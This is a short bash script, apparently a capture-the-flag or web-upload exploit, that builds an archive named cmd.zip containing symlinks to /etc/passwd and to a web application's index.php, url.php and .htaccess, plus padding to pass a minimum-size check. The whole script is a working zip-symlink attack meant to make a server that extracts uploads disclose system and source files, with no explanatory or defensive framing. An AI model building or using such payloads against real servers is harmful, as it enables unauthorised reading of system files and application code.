#!/bin/bash

# file cannot be too small
for i in `seq 1 50`
do
    echo bullsh1t >> testfile.txt
done

# add symlinks 
ln -s /etc/passwd passwd
ln -s ../../index.php index
ln -s ../../url.php url
ln -s ../../.htaccess htaccess

# zip stuff
zip --symlinks cmd.zip testfile.txt passwd index url htaccess

# cleanup
rm passwd index url htaccess testfile.txt
